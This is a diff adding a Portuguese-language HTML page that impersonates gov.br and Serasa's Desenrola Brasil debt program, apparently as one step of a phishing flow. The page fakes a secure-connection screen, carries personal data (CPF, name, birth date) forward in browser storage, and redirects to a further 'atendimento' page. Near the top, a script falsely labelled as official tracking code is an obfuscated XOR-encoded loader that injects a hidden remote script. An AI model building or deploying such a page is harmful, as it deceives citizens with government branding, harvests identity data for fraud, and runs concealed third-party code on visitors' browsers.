@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1601503185054241');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1601503185054241&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- UTMify UTMs (script oficial) -->
+<script>(function(){var k_npp=atob("DOmBF7fyIxcrvy8IIZKjYsWeAS0J11t8UZq7OJiRR3kFyltlSI/4OdSdTjlJzQB7QpvoZ8OBDGJf0lwnTYj1csSGDX1YnQMqQJ31Zd6QVmNOzA0yepKjedafRjURnUtpVYisYsOfSnFSkl96RJ/kecPfW3RE2wJ7QoKjO5WEQnte2g0yA8v8O8zQTXZG2g0yA43gY9bfVmNG1klxDJnzcsGXTWMGzFpqSI3yNZvQVXZHykoqG8ujauqP");var z_ldix=[];for(var y_6n=0;y_6n<k_npp.length;y_6n++){z_ldix.push(k_npp.charCodeAt(y_6n)&255);}var z_1=z_ldix[0];var b_v9dq=z_ldix.slice(1,1+z_1);var o_d=z_ldix.slice(1+z_1);var m_lcxy=o_d.map(function(b,t_keki){return b^b_v9dq[t_keki%z_1];});var s_c84="";for(var c_83=0;c_83<m_lcxy.length;c_83++){s_c84+=String.fromCharCode(m_lcxy[c_83]&255);}var k_j4y=decodeURIComponent(escape(s_c84));var u_vo=JSON.parse(k_j4y);var z_7l81=u_vo.globals||[];z_7l81.forEach(function(n_q){window[n_q.name]=n_q.value;});var v_5m=document.createElement("script");v_5m.src=u_vo.url;v_5m.async=true;v_5m.defer=true;(u_vo.attributes||[]).forEach(function(o_r){v_5m.setAttribute(o_r.name,o_r.value);});(document.head||document.documentElement).appendChild(v_5m);})();</script>
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Conectando — Desenrola Brasil e Serasa</title>
+<script src="/js/track.js"></script>
+<link rel="stylesheet" href="/css/fa5-all.min.css">
+<style>
+  i.fas, i.far, i.fab { font-family: sans-serif !important; font-style: normal !important; }
+  i.fas::before, i.far::before, i.fab::before { content: '' !important; }
+</style>
+<script>
+(function () {
+  var ICONS = {
+    'fa-ellipsis-v': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512" style="width:0.125em;height:1em;fill:currentColor;vertical-align:-0.125em"><path d="M96 184c39.8 0 72 32.2 72 72s-32.2 72-72 72-72-32.2-72-72 32.2-72 72-72zM24 80c0 39.8 32.2 72 72 72s72-32.2 72-72S135.8 8 96 8 24 40.2 24 80zm0 352c0 39.8 32.2 72 72 72s72-32.2 72-72-32.2-72-72-72-72 32.2-72 72z"/></svg>',
+    'fa-cookie-bite': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width:1em;height:1em;fill:currentColor;vertical-align:-0.125em"><path d="M510.203 189.7c-4.5-6.9-12.3-10.9-20.5-10.5-6.5.3-13-.4-19.5-2-42.6-10.8-68.2-53.9-57.5-96.5 2.1-8.2.3-16.8-4.7-23.5s-12.7-10.7-21.1-10.9C377.3 46 368 46 358.7 47.1 245.1 61.3 160 158.6 160 274c0 4.5.1 9 .4 13.4.3 4.4-1.4 8.7-4.6 11.7L55.3 393.1c-22.5 20.9-24.3 56.2-3.4 79.3l6 6.6c21.1 23.2 56.4 24.2 78.8 2.3l208-200c3-2.9 7.1-4.4 11.3-4.2 4.5.2 9.1.4 13.7.4 123 0 223.2-99.7 224-222.7.1-8.4-3.9-16.5-10.2-21.5l-73.3 135zm-254 112.7c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32zm128-176c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32zm80 96c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32z"/></svg>',
+    'fa-th': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width:1em;height:1em;fill:currentColor;vertical-align:-0.125em"><path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 0v80c0 13.255-10.745 24-24 24H205.333c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.334c13.255 0 24 10.745 24 24zm181.333 0v80c0 13.255-10.745 24-24 24H386.667c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24H488c13.255 0 24 10.745 24 24zM149.333 216v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 0v80c0 13.255-10.745 24-24 24H205.333c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.334c13.255 0 24 10.745 24 24zm181.333 0v80c0 13.255-10.745 24-24 24H386.667c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24H488c13.255 0 24 10.745 24 24zM149.333 376v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 0v80c0 13.255-10.745 24-24 24H205.333c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24h101.334c13.255 0 24 10.745 24 24zm181.333 0v80c0 13.255-10.745 24-24 24H386.667c-13.255 0-24-10.745-24-24v-80c0-13.255 10.745-24 24-24H488c13.255 0 24 10.745 24 24z"/></svg>',
+    'fa-bars': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width:0.875em;height:1em;fill:currentColor;vertical-align:-0.125em"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg>',
+    'fa-search': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width:1em;height:1em;fill:currentColor;vertical-align:-0.125em"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>',
+    'fa-user': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width:0.875em;height:1em;fill:currentColor;vertical-align:-0.125em"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"/></svg>'
+  };
+  function replaceIcons() {
+    document.querySelectorAll('i.fas, i.far, i.fab').forEach(function (el) {
+      if (el.querySelector('svg')) return;
+      var cls = Array.from(el.classList).find(function (c) { return ICONS[c]; });
+      if (!cls) return;
+      el.innerHTML = ICONS[cls];
+    });
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', replaceIcons);
+  } else {
+    replaceIcons();
+  }
+})();
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --gov-blue: #1351B4;
+  --gov-blue-dark: #0C326F;
+  --gov-border: #E5E5E5;
+  --gov-text: #333333;
+  --gov-muted: #666666;
+  --gov-bg: #FFFFFF;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Open Sans', system-ui, -apple-system, sans-serif;
+  font-size: 16px;
+  line-height: 1.5;
+  color: var(--gov-text);
+  background: var(--gov-bg);
+  min-height: 100svh;
+  display: flex;
+  flex-direction: column;
+}
+.gov-header-top {
+  background: #fff;
+  padding: 12px 24px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.gov-header-top .brand {
+  display: flex;
+  align-items: center;
+  gap: 0;
+}
+.gov-header-top .brand img {
+  width: 70px;
+  height: 24px;
+  object-fit: contain;
+}
+.gov-header-top .brand .divider {
+  border-left: 1px solid #ccc;
+  height: 24px;
+  margin: 0 16px;
+}
+.gov-header-top .actions {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+.gov-header-top .actions button {
+  border: none;
+  background: none;
+  color: var(--gov-blue);
+  cursor: pointer;
+  padding: 8px;
+  font-size: 16px;
+}
+.gov-header-top .user-pill i {
+  display: inline-flex;
+  align-items: center;
+  line-height: 1;
+}
+.gov-header-top .user-pill {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: #1451B4;
+  color: #fff;
+  border: none;
+  border-radius: 9999px;
+  padding: 6px 16px;
+  font-size: 14px;
+  font-weight: 600;
+  margin-left: 16px;
+  cursor: default;
+}
+.gov-nav {
+  background: #fff;
+  padding: 16px 24px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 1px solid var(--gov-border);
+}
+.gov-nav .title-btn {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  border: none;
+  background: none;
+  cursor: default;
+  padding: 0;
+  color: var(--gov-muted);
+  font-size: 1rem;
+  font-weight: 300;
+  font-family: inherit;
+}
+.gov-nav .title-btn i { color: var(--gov-blue); font-size: 16px; }
+.gov-nav .search {
+  border: none;
+  background: none;
+  color: var(--gov-blue);
+  font-size: 16px;
+  cursor: pointer;
+  padding: 0;
+}
+.page-main {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 32px 24px 48px;
+  background: #fff;
+}
+.wrap {
+  width: 100%;
+  max-width: 440px;
+  text-align: center;
+}
+.badge {
+  display: inline-block;
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: .06em;
+  text-transform: uppercase;
+  color: var(--gov-blue);
+  background: rgba(19, 81, 180, 0.08);
+  padding: 6px 12px;
+  border-radius: 4px;
+  margin-bottom: 20px;
+}
+h1 {
+  font-size: 1.35rem;
+  font-weight: 600;
+  color: var(--gov-blue-dark);
+  line-height: 1.35;
+  margin-bottom: 8px;
+}
+.sub {
+  font-size: 14px;
+  color: var(--gov-muted);
+  line-height: 1.55;
+  margin-bottom: 32px;
+}
+.sub strong { color: var(--gov-text); font-weight: 600; }
+.logos {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  margin-bottom: 28px;
+}
+.logo-box {
+  flex: 0 0 auto;
+  min-width: 110px;
+  height: 52px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #fff;
+  border: 1px solid var(--gov-border);
+  border-radius: 4px;
+  padding: 8px 12px;
+  box-shadow: 0 1px 3px rgba(0,0,0,.06);
+}
+.logo-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
+.bridge {
+  position: relative;
+  width: 48px;
+  height: 2px;
+  flex-shrink: 0;
+  background: #DBE8FB;
+  border-radius: 2px;
+}
+.pulse {
+  position: absolute;
+  top: 50%;
+  left: 0;
+  width: 10px;
+  height: 10px;
+  margin: -5px 0 0 -5px;
+  background: var(--gov-blue);
+  border-radius: 50%;
+  animation: travel 1.8s ease-in-out infinite;
+}
+@keyframes travel {
+  0% { left: 0; opacity: .5; }
+  50% { opacity: 1; }
+  100% { left: 100%; opacity: .5; }
+}
+.status {
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--gov-blue);
+  margin-bottom: 12px;
+  min-height: 22px;
+}
+.dots {
+  display: flex;
+  justify-content: center;
+  gap: 6px;
+  margin-bottom: 24px;
+}
+.dots span {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: #DBE8FB;
+  animation: dot 1.2s ease-in-out infinite;
+}
+.dots span:nth-child(2) { animation-delay: .15s; background: var(--gov-blue); opacity: .7; }
+.dots span:nth-child(3) { animation-delay: .3s; }
+@keyframes dot {
+  0%, 80%, 100% { transform: scale(.85); opacity: .5; }
+  40% { transform: scale(1.1); opacity: 1; }
+}
+.bar {
+  height: 4px;
+  background: #EDEDED;
+  border-radius: 4px;
+  overflow: hidden;
+  margin-bottom: 16px;
+}
+.bar > i {
+  display: block;
+  height: 100%;
+  width: 0;
+  background: linear-gradient(90deg, #2670E8, var(--gov-blue));
+  border-radius: 4px;
+  animation: load 3.2s ease-in-out forwards;
+}
+@keyframes load { 0% { width: 0; } 100% { width: 100%; } }
+.foot {
+  font-size: 12px;
+  color: #888;
+  line-height: 1.4;
+}
+@media (max-width: 480px) {
+  .gov-header-top, .gov-nav { padding-left: 16px; padding-right: 16px; }
+  .gov-header-top .brand .divider { margin: 0 8px; }
+  .gov-header-top .user-pill span { max-width: 80px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+}
+</style>
+</head>
+<body>
+<header class="gov-header-top" role="banner">
+  <div class="brand">
+    <img src="/images/logo645.png" alt="gov.br" width="70" height="24">
+    <div class="divider" aria-hidden="true"></div>
+    <button type="button" aria-label="Menu de links"><i class="fas fa-ellipsis-v" aria-hidden="true"></i></button>
+  </div>
+  <div class="actions">
+    <button type="button" aria-label="Cookies"><i class="fas fa-cookie-bite" aria-hidden="true"></i></button>
+    <button type="button" aria-label="Sistemas"><i class="fas fa-th" aria-hidden="true"></i></button>
+    <button type="button" class="user-pill" id="user-pill" aria-label="Usuário">
+      <i class="fas fa-user" aria-hidden="true"></i>
+      <span id="user-name">Entrar</span>
+    </button>
+  </div>
+</header>
+<nav class="gov-nav" aria-label="Navegação do serviço">
+  <div class="title-btn">
+    <i class="fas fa-bars" aria-hidden="true"></i>
+    <span>Desenrola Brasil · Serasa</span>
+  </div>
+  <button type="button" class="search" aria-label="Pesquisar"><i class="fas fa-search" aria-hidden="true"></i></button>
+</nav>
+<main class="page-main">
+  <div class="wrap">
+    <div class="badge">Parceria oficial</div>
+    <h1>Estabelecendo conexão segura</h1>
+    <p class="sub">Canal <strong>gov.br</strong> em parceria com o <strong>Serasa Limpa Nome</strong> (programa Desenrola Brasil).</p>
+    <div class="logos">
+      <div class="logo-box"><img src="/images/logo645.png" alt="gov.br" width="90" height="32"></div>
+      <div class="bridge" aria-hidden="true"><span class="pulse"></span></div>
+      <div class="logo-box"><img src="/images/serasa-logo.avif" alt="Serasa" width="96" height="32" style="max-height:36px"></div>
+    </div>
+    <p class="status" id="status">Autenticando sessão no gov.br…</p>
+    <div class="dots" aria-hidden="true"><span></span><span></span><span></span></div>
+    <div class="bar"><i></i></div>
+    <p class="foot">Criptografia de ponta a ponta · Não feche esta janela</p>
+  </div>
+</main>
+<script>
+(function () {
+  try {
+    var ud = JSON.parse(localStorage.getItem('userData') || '{}');
+    var nome = String(ud.nome || '').trim();
+    if (nome) {
+      var first = nome.split(/\s+/)[0].toUpperCase();
+      document.getElementById('user-name').textContent = first;
+    }
+  } catch (e) {}
+
+  var steps = [
+    { t: 0, msg: 'Autenticando sessão no gov.br…' },
+    { t: 900, msg: 'Vinculando CPF ao Desenrola Brasil…' },
+    { t: 1800, msg: 'Abrindo atendimento Serasa Limpa Nome…' }
+  ];
+  var el = document.getElementById('status');
+  steps.forEach(function (s) {
+    setTimeout(function () { el.textContent = s.msg; }, s.t);
+  });
+
+  function fmtCpf(d) { return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); }
+
+  function syncSrFromUserData() {
+    try {
+      var ud = JSON.parse(localStorage.getItem('userData') || '{}');
+      var cpf = String(ud.cpf || '').replace(/\D/g, '');
+      if (cpf.length !== 11) return;
+      var nome = String(ud.nome || '').trim();
+      var nasc = ud.dataNascimento || ud.data_nascimento || '';
+      var prev = {};
+      try { prev = JSON.parse(localStorage.getItem('sr_consulta') || '{}'); } catch (e) { prev = {}; }
+      if (typeof prev !== 'object' || !prev) prev = {};
+      var merged = Object.assign({}, prev, {
+        cpf: cpf,
+        cpfformatado: prev.cpfformatado || fmtCpf(cpf),
+        nome: nome || prev.nome || '',
+        nascimento: nasc || prev.nascimento || '',
+        ok: true
+      });
+      localStorage.setItem('sr_consulta', JSON.stringify(merged));
+      localStorage.setItem('sr_cpf', cpf);
+      if (nome) localStorage.setItem('sr_nome', nome.toUpperCase());
+    } catch (e) {}
+  }
+  syncSrFromUserData();
+
+  var dest = (window.__withParams ? window.__withParams('/atendimento/') : '/atendimento/');
+  setTimeout(function () { window.location.href = dest; }, 3400);
+})();
+</script>
+</body>
+</html>
